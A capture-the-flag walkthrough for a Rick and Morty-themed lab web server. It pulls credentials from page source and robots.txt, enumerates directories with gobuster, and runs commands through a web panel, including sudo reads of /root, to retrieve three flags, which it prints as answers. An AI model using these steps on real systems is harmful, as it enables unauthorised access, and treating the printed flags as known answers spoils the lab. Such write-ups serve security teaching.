# Problem
This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

# Solution

## Step 1: Initial Reconnaissance
`curl http://ip_address/` or use inspect (F12) to view the source code.
We obtain the username: `R1ckRul3s`

`curl http://ip_address/robots.txt`
Output: `Wubbalubbadubdub`

## Step 2: Directory Enumeration
Now that we have credentials, use gobuster to find the login page:
`gobuster dir -u ip_address -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o dir_results.txt`

After enumeration, you will see `portal.php`, `login.php`, and `clue.txt`.
Log in using the credentials obtained above.

In the Command Panel, you will see the following files:
`Sup3rS3cretPickl3Ingred.txt`, `assets`, `clue.txt`, `denied.php`, `index.html`, `login.php`, `portal.php`, `robots.txt`

## Step 3: Finding the Flags

**Flag 1:**
`strings Sup3rS3cretPickl3Ingred.txt`
Flag 1: `mr. meeseek hair`

**Flag 2:**
`strings clue.txt`
Output: "Look around the file system for the other ingredient."

`find / -name "*ingred*" 2>/dev/null`
Output: `/home/rick/second ingredients`

`strings "/home/rick/second ingredients"`
Flag 2: `jerry tear`

**Flag 3:**
`sudo ls -la /root`
`sudo strings /root/3rd.txt`
Flag 3: `fleeb juice`

We saved Rick. Hopefully he won't get into pickle form again!
